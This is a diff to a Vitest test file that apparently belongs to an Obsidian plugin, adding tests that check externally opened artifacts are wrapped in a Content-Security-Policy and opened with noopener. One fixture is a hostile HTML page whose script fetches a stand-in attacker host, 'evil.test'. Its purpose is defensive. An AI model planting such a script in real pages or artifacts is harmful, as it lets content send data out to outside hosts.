@@ -1,6 +1,6 @@
-import { describe, expect, it } from "vitest";
+import { afterEach, describe, expect, it, vi } from "vitest";
 import { App, FakeElement } from "obsidian";
-import { ArtifactModal, renderArtifactInline } from "../../src/artifacts/renderInline";
+import { ArtifactModal, openArtifactExternally, renderArtifactInline } from "../../src/artifacts/renderInline";
 
 /** Sandbox tokens that would each hand an artifact a capability it must not have. */
 const FORBIDDEN_SANDBOX_TOKENS = [
@@ -128,5 +128,58 @@ describe("artifact sandbox parity", () => {
     expect(b.sandbox).toBe(a.sandbox);
     expect(b.allow).toBe(a.allow);
     expect(b.srcdoc).toBe(a.srcdoc);
+  });
+});
+
+describe("openArtifactExternally", () => {
+  const host = globalThis as { require?: unknown; window: { open?: unknown } };
+  let realRequire: unknown;
+
+  afterEach(() => {
+    host.require = realRequire;
+    delete host.window.open;
+    vi.restoreAllMocks();
+  });
+
+  function installFakeDesktop(): { written: { value: string } } {
+    realRequire = host.require;
+    const written = { value: "" };
+    host.require = (m: string) => {
+      if (m === "os") return { tmpdir: () => "/tmp", platform: () => "linux" };
+      if (m === "path") return { join: (...p: string[]) => p.join("/") };
+      if (m === "fs")
+        return {
+          promises: {
+            writeFile: async (_p: string, data: string) => {
+              written.value = data;
+            },
+            readdir: async () => [],
+            stat: async () => ({ mtimeMs: Date.now() }),
+            unlink: async () => {},
+          },
+        };
+      if (m === "electron") return { shell: { openPath: async () => "" } };
+      return undefined;
+    };
+    return { written };
+  }
+
+  it("writes the CSP-guarded document to the temp file, not the raw artifact", async () => {
+    const fake = installFakeDesktop();
+    const hostile = "<html><body><script>fetch('https://evil.test')</script></body></html>";
+    await openArtifactExternally(hostile, "Hostile");
+    expect(fake.written.value).toContain("connect-src 'none'");
+    expect(fake.written.value).toContain("Content-Security-Policy");
+  });
+
+  it("uses noopener on the window.open fallback", async () => {
+    realRequire = host.require;
+    host.require = undefined; // force the native-module-missing path
+    const open = vi.fn();
+    host.window.open = open;
+    await openArtifactExternally(PAGE, "Artifact");
+    expect(open).toHaveBeenCalledWith(expect.stringContaining("data:text/html"), "_blank", "noopener,noreferrer");
+    // The fallback URL is CSP-guarded too.
+    expect(decodeURIComponent(String(open.mock.calls[0]?.[0]))).toContain("connect-src 'none'");
   });
 });
